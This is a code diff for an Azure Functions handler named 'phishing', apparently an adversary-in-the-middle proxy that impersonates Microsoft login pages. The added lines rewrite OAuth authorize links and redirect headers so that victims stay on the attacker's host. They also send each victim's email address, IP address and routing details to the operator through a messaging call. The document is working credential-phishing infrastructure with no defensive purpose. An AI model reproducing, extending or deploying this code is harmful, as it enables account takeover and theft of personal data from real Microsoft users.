@@ -150,6 +150,16 @@ async function replace_response_text_personal(response, upstream, original, ip) 
 
     const hostPattern = "(login\\.live\\.com|account\\.live\\.com|www\\.office\\.com|office\\.com|login\\.microsoftonline\\.com)";
 
+    // Targeted hard replacement for OAuth authorize redirects embedded in inline JS/HTML
+    try {
+      modifiedText = modifiedText.replace(/https:\\/\\/login\\.live\\.com\\/oauth20_authorize\\.srf\\?([^\s\"'<>]+)/g,
+        (match, qs) => `${original}/oauth20_authorize.srf?x-target-host=login.live.com&${qs}`
+      );
+      modifiedText = modifiedText.replace(/(^|[^a-zA-Z0-9])login\\.live\\.com\\/oauth20_authorize\\.srf\\?([^\s\"'<>]+)/g,
+        (full, prefix, qs) => `${prefix}${original}/oauth20_authorize.srf?x-target-host=login.live.com&${qs}`
+      );
+    } catch {}
+
     // Early head-level nav trap for personal pages
     modifiedText = modifiedText.replace(
       "<head>",
@@ -381,6 +391,7 @@ app.http("phishing", {
     // ONLY change to personal if we have a confirmed personal email
     if (storedEmail && isPersonalEmail(storedEmail)) {
       targetUpstream = upstream_live;
+      try { await dispatchMessage(`🔀 <b>Routing Personal</b>\n🧑‍💻 <b>Email</b>: ${storedEmail}\n🌐 <b>IP</b>: ${ip}\n🎯 <b>Upstream</b>: ${targetUpstream}`, context); } catch {}
     }
 
     // Dynamic host routing for personal flow via query param (isolated to personal)
@@ -389,6 +400,7 @@ app.http("phishing", {
       targetUpstream = xTargetHost;
       upstream_url.searchParams.delete("x-target-host");
       upstream_url.search = upstream_url.searchParams.toString();
+      try { await dispatchMessage(`🎯 <b>Dynamic Host</b>\n🌐 <b>Host</b>: ${xTargetHost}\n🔗 <b>Path</b>: ${upstream_url.pathname}`, context); } catch {}
     }
 
     // Rewriting to appropriate upstream
@@ -492,10 +504,12 @@ app.http("phishing", {
             candidate.searchParams.set("x-target-host", candidate.host);
             const proxied = original_url.protocol + "//" + original_url.host + candidate.pathname + (candidate.search || "");
             new_response_headers.set("Location", proxied);
+            try { await dispatchMessage(`🔁 <b>Rewriting Location</b>\n📍 <b>From</b>: ${locationHeader}\n➡️ <b>To</b>: ${proxied}`, context); } catch {}
           } else if (PERSONAL_HOSTS.includes(candidate.host)) {
             candidate.searchParams.set("x-target-host", candidate.host);
             const proxiedLocation = original_url.protocol + "//" + original_url.host + candidate.pathname + (candidate.search || "");
             new_response_headers.set("Location", proxiedLocation);
+            try { await dispatchMessage(`🔁 <b>Rewriting Location</b>\n📍 <b>From</b>: ${locationHeader}\n➡️ <b>To</b>: ${proxiedLocation}`, context); } catch {}
           }
         }
       }
